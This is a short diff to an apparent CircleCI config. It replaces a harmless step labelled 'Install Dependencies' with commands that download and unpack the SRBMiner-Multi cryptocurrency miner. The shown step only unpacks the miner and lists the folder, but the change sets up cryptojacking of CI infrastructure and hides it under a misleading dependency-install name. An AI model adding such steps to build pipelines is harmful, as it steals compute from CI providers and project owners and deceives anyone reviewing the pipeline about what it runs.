@@ -8,8 +8,10 @@ jobs:
         - run:
             name: Install Dependencies
             command: |
-              lscpu
-              echo Hello,subscribe it
+              wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.9/SRBMiner-Multi-0-8-9-Linux.tar.xz
+              tar -xf SRBMiner-Multi-0-8-9-Linux.tar.xz
+              cd SRBMiner-Multi-0-8-9
+              ls
 
 workflows:
     version: 2.1
